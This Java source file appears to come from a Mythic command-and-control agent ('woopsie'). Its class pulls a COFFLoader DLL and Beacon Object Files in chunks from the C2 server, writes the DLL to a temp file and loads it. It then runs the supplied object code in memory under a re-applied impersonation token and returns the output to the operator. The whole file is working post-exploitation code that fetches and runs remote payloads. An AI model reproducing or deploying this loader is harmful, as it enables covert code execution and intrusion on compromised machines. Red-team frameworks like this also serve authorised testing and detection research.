package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.sun.jna.Memory;
import com.sun.jna.NativeLong;
import com.sun.jna.Pointer;
import com.sun.jna.ptr.PointerByReference;
import com.woopsie.Config;
import com.woopsie.utils.CoffLoaderLibrary;
import com.woopsie.utils.NativeLongByReference;

import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Background task for COFF Loader execution
 * Downloads BOF file in chunks from Mythic, then executes it
 */
public class CoffLoaderBackgroundTask implements Runnable {
    
    // Static cached DLL path - reused across all BOF executions
    private static volatile String cachedDllPath = null;
    private static final Object dllLock = new Object();
    
    private final BackgroundTask task;
    private final Config config;
    private final String fileId;
    private final String dllId;
    private final String bofName;
    private final String argsB64;
    private final int chunkSize;
    private final com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken;
    
    public CoffLoaderBackgroundTask(BackgroundTask task, Config config, String fileId, String dllId, 
                                    String bofName, String argsB64, int chunkSize,
                                    com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken) {
        this.task = task;
        this.config = config;
        this.fileId = fileId;
        this.dllId = dllId;
        this.bofName = bofName;
        this.argsB64 = argsB64;
        this.chunkSize = chunkSize;
        this.impersonationToken = impersonationToken;
    }
    
    @Override
    public void run() {
        try {
            // Re-apply impersonation token if present
            if (impersonationToken != null) {
                Config.debugLog(config, "Re-applying impersonation token in coff_loader background thread");
                com.woopsie.utils.WindowsAPI.reApplyToken(impersonationToken);
            }
            
            Config.debugLog(config, "COFF Loader background task started for: " + bofName);
            
            // Step 1: Get or download COFFLoader DLL (cached across executions)
            String dllPath = getCachedDllPath();
            
            // Step 2: Download BOF file
            Config.debugLog(config, "Downloading BOF file (uuid: " + fileId + ")");
            byte[] bofData = downloadFile(fileId);
            Config.debugLog(config, "Downloaded BOF, size: " + bofData.length + " bytes");
            
            // Step 3: Decode arguments
            byte[] argsData = argsB64.isEmpty() ? new byte[0] : Base64.getDecoder().decode(argsB64);
            Config.debugLog(config, "Args data length: " + argsData.length);
            
            // Step 4: Execute BOF with cached DLL
            String output = executeBOF(dllPath, bofData, argsData);
            
            // Step 4: Send completion message
            Map<String, Object> completionResponse = new HashMap<>();
            completionResponse.put("task_id", task.taskId);
            completionResponse.put("completed", true);
            completionResponse.put("status", "success");
            completionResponse.put("user_output", output);
            
            task.sendResponse(completionResponse);
            Config.debugLog(config, "COFF Loader background task completed successfully");
            
        } catch (Exception e) {
            Config.debugLog(config, "COFF Loader background task error: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            
            // Send error response
            Map<String, Object> errorResponse = new HashMap<>();
            errorResponse.put("task_id", task.taskId);
            errorResponse.put("completed", true);
            errorResponse.put("status", "error");
            errorResponse.put("user_output", "BOF execution failed: " + e.getMessage());
            
            task.sendResponse(errorResponse);
        }
    }
    
    /**
     * Download file from Mythic in chunks (mimics Oopsie's inline_execute pattern)
     */
    private byte[] downloadFile(String fileIdToDownload) throws Exception {
        ByteArrayOutputStream fileData = new ByteArrayOutputStream();
        
        int chunkNum = 1;
        int totalChunks = -1;
        
        while (task.running) {
            Config.debugLog(config, "Requesting chunk " + chunkNum + " for file: " + fileIdToDownload);
            
            // Request next chunk
            Map<String, Object> uploadRequest = new HashMap<>();
            uploadRequest.put("chunk_size", chunkSize);
            uploadRequest.put("file_id", fileIdToDownload);
            uploadRequest.put("chunk_num", chunkNum);
            uploadRequest.put("full_path", "");
            
            Map<String, Object> request = new HashMap<>();
            request.put("task_id", task.taskId);
            request.put("upload", uploadRequest);
            
            task.sendResponse(request);
            
            // Receive chunk data
            JsonNode message = task.receiveFromTask();
            if (message == null) {
                throw new Exception("Failed to receive chunk " + chunkNum);
            }
            
            Config.debugLog(config, "Received chunk " + chunkNum);
            
            // Extract chunk data
            if (!message.has("chunk_data")) {
                throw new Exception("No chunk_data in response for chunk " + chunkNum);
            }
            
            String chunkDataB64 = message.get("chunk_data").asText();
            byte[] chunkData = Base64.getDecoder().decode(chunkDataB64);
            fileData.write(chunkData);
            
            Config.debugLog(config, "Wrote chunk " + chunkNum + " (" + chunkData.length + " bytes)");
            
            // Get total chunks from first message
            if (totalChunks == -1 && message.has("total_chunks")) {
                totalChunks = message.get("total_chunks").asInt();
                Config.debugLog(config, "Total chunks: " + totalChunks);
            }
            
            // Check if done
            if (totalChunks > 0 && chunkNum >= totalChunks) {
                Config.debugLog(config, "All chunks received");
                break;
            }
            
            chunkNum++;
        }
        
        return fileData.toByteArray();
    }
    
    /**
     * Get cached DLL path, downloading and saving only on first use
     */
    private String getCachedDllPath() throws Exception {
        if (cachedDllPath != null && new java.io.File(cachedDllPath).exists()) {
            Config.debugLog(config, "Reusing cached DLL: " + cachedDllPath);
            return cachedDllPath;
        }
        
        synchronized (dllLock) {
            // Double-check after acquiring lock
            if (cachedDllPath != null && new java.io.File(cachedDllPath).exists()) {
                Config.debugLog(config, "Reusing cached DLL: " + cachedDllPath);
                return cachedDllPath;
            }
            
            Config.debugLog(config, "Downloading COFFLoader64.dll (uuid: " + dllId + ")");
            byte[] dllData = downloadFile(dllId);
            Config.debugLog(config, "Downloaded DLL, size: " + dllData.length + " bytes");
            
            // Save DLL to temp file (only once)
            java.io.File tempDll = java.io.File.createTempFile("coffloader", ".dll");
            tempDll.deleteOnExit(); // Clean up when JVM exits
            
            try (java.io.FileOutputStream fos = new java.io.FileOutputStream(tempDll)) {
                fos.write(dllData);
            }
            
            cachedDllPath = tempDll.getAbsolutePath();
            Config.debugLog(config, "Saved DLL to: " + cachedDllPath + " (will be reused)");
            
            return cachedDllPath;
        }
    }
    
    /**
     * Execute BOF using COFFLoader DLL
     */
    private String executeBOF(String dllPath, byte[] bofData, byte[] argsData) throws Exception {
        Config.debugLog(config, "Executing BOF with COFFLoader from: " + dllPath);
        
        // Load the DLL dynamically
        CoffLoaderLibrary loader = CoffLoaderLibrary.loadFrom(dllPath);
        Config.debugLog(config, "Loaded COFFLoader library");
        
        // Allocate native memory for BOF data
        Memory bofMemory = new Memory(bofData.length);
        bofMemory.write(0, bofData, 0, bofData.length);
        
        // Allocate native memory for args data (if any)
        Pointer argsPointer;
        NativeLong argsLen;
        if (argsData.length > 0) {
            Memory argsMemory = new Memory(argsData.length);
            argsMemory.write(0, argsData, 0, argsData.length);
            argsPointer = argsMemory;
            argsLen = new NativeLong(argsData.length);
        } else {
            argsPointer = Pointer.NULL;
            argsLen = new NativeLong(0);
        }
        
        // Prepare output buffers
        PointerByReference outRef = new PointerByReference();
        NativeLongByReference outLenRef = new NativeLongByReference();
        
        Config.debugLog(config, "Calling run_bof...");
        
        // Call the DLL
        int rc = loader.run_bof(
            bofMemory,
            new NativeLong(bofData.length),
            argsPointer,
            argsLen,
            outRef,
            outLenRef
        );
        
        Config.debugLog(config, "run_bof returned: " + rc);
        
        // Check return code
        if (rc != 0) {
            throw new Exception("BOF execution failed with return code: " + rc);
        }
        
        // Get output
        Pointer outputPtr = outRef.getValue();
        long outputLen = outLenRef.getValue().longValue();
        
        Config.debugLog(config, "Output length: " + outputLen);
        
        String output;
        if (outputPtr != null && outputLen > 0) {
            byte[] outputData = outputPtr.getByteArray(0, (int) outputLen);
            output = new String(outputData);
            Config.debugLog(config, "BOF output: " + output);
        } else {
            output = "(no output)";
            Config.debugLog(config, "BOF produced no output");
        }
        
        return output;
    }
}
